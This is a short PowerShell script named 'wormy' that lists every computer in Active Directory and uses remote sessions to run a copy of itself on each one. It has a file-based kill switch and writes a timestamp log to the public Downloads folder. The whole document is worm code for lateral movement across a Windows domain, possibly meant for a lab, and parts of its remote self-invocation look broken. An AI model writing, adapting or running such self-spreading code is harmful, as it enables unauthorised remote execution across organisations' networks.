function wormy{

while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
start-job -Scriptblock{[int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'}
Write-Output 'slither'
$computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
Foreach($i in $computerNames){
    $s = new-pssession -ComputerName $i
    invoke-command -ComputerName $i -ScriptBlock {hostname}
    invoke-command -ComputerName $i -ScriptBlock {
        #get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 5 
        if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
            if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 5){
            Invoke-Command -ScriptBlock {


                function wormy{
                start-job -Scriptblock{[int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'}
                while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
                Write-Output 'slither'
                $computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
                Foreach($i in $computerNames){
                    $s = new-pssession -ComputerName $i
                    invoke-command -ComputerName $i -ScriptBlock {hostname}
                    invoke-command -ComputerName $i -ScriptBlock {
        
                        if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 5 ){
                            Invoke-Command -ScriptBlock {
                            wormy
                            }
                            }
                        }
                    }
                    Exit-PSSession
                    start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
                }
                }


                wormy



                    }
            }
            }
            else{}
        }
    }
    Exit-PSSession
    start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
}
}


wormy